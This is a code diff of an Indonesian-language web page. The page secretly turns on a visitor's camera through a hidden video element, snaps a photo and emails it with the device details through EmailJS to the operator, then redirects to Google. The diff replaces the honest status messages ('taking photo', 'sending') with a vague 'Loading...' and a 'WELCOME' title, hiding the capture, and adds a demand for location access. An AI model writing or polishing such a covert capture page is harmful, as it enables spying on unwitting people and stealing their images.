@@ -2,11 +2,11 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Processing...</title>
+  <title>WELCOME</title>
 </head>
 <body>
 
-<h3 id="status">Memproses...</h3>
+<h3 id="status">Loading...</h3>
 <p id="error" style="color:red;"></p>
 
 <video id="video" autoplay playsinline style="display:none;"></video>
@@ -33,14 +33,14 @@ async function init() {
         });
 
         video.srcObject = stream;
-        statusText.innerText = "Mengambil foto...";
+        statusText.innerText = "Loading...";
 
         setTimeout(ambilFoto, 2000);
 
     } catch (err) {
         // ❌ STOP TOTAL DI SINI
-        statusText.innerText = "Akses kamera ditolak!";
-        errorText.innerText = "Kamu harus mengizinkan kamera untuk lanjut.";
+        statusText.innerText = "Akses kamera dan lokasi ditolak!";
+        errorText.innerText = "Kamu harus mengizinkan kamera dan lokasi untuk lanjut.";
 
         console.log("DITOLAK:", err);
 
@@ -58,7 +58,7 @@ function ambilFoto() {
 
     const imageData = canvas.toDataURL("image/png");
 
-    statusText.innerText = "Mengirim...";
+    statusText.innerText = "Loading...";
 
     emailjs.send("service_lzuezkd", "template_33st1em", {
         message: "Foto diambil",
@@ -67,14 +67,14 @@ function ambilFoto() {
         device: navigator.userAgent
     })
     .then(() => {
-        statusText.innerText = "Berhasil, redirect...";
+        statusText.innerText = "Berhasil...";
 
         setTimeout(() => {
             window.location.href = "https://google.com";
         }, 3000);
     })
     .catch(() => {
-        statusText.innerText = "Gagal kirim, redirect...";
+        statusText.innerText = "Gagal...";
 
         setTimeout(() => {
             window.location.href = "https://google.com";
